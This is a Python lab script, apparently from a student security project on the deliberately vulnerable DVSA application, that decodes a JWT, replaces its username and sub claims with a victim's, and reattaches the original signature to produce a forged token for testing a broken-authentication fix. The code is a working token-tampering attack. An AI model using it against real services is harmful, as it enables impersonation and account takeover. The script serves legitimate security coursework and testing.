import base64
import json

"""
ICS344 DVSA Security Project
Lesson 2 - Broken Authentication

This helper script demonstrates how a JWT payload can be decoded and modified
for documentation/testing inside the DVSA lab environment.

Important:
- Do not commit real JWT values to GitHub.
- Replace the placeholders below with temporary lab tokens only.
- After the fix, the backend should reject the modified token as invalid.
"""

TOKEN_B = "USER_B_TOKEN_HERE"
VICTIM_USERNAME = "USER_C_USERNAME_HERE"
VICTIM_SUB = "USER_C_SUB_HERE"


def b64url_decode(data: str) -> bytes:
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode((data + padding).encode())


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


print("=" * 70)
print("Lesson 2 - Broken Authentication JWT Payload Test")
print("=" * 70)

try:
    header_b64, payload_b64, signature_b64 = TOKEN_B.split(".")

    header = json.loads(b64url_decode(header_b64))
    payload = json.loads(b64url_decode(payload_b64))

    print("[1] Original JWT header:")
    print(json.dumps(header, indent=4))

    print("\n[2] Original JWT payload:")
    print(json.dumps(payload, indent=4))

    payload["username"] = VICTIM_USERNAME
    payload["sub"] = VICTIM_SUB

    new_payload_b64 = b64url_encode(
        json.dumps(payload, separators=(",", ":")).encode()
    )

    forged_token = header_b64 + "." + new_payload_b64 + "." + signature_b64

    print("\n[3] Modified JWT payload:")
    print(json.dumps(payload, indent=4))

    print("\n[4] Forged token:")
    print(forged_token)

    print("\n[!] Vulnerable version: backend may accept this modified token.")
    print("[+] Fixed version: backend should reject it with invalid token.")

except ValueError:
    print("[ERROR] Invalid JWT format. TOKEN_B must contain three dot-separated parts.")
except Exception as error:
    print("[ERROR] Failed to process token:")
    print(error)
